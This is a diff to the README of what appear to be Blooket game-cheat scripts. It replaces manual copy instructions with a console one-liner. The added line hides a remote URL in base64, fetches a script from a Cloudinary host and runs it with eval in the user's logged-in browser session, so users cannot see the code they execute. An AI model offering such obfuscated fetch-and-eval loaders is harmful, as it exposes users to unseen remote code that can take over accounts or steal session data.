@@ -5,12 +5,12 @@
 ### See other people's blooks in the form of your own blook page
 </br>
 
-Click on `js`
-- blookViewer.js
-- copy button (two papers icon)
-Go to blooket blooks page
-- open up console (ctrl + shift + j)
-- paste code into console
+Open console (ctrl + shift + j) and paste the following:
+
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMjc5MTQvYmxvb2tWaWV3ZXIuanM=')).then((res) => res.text().then((t) => eval(t)))
+
+```
 
 
 # blookInfoExtender.js
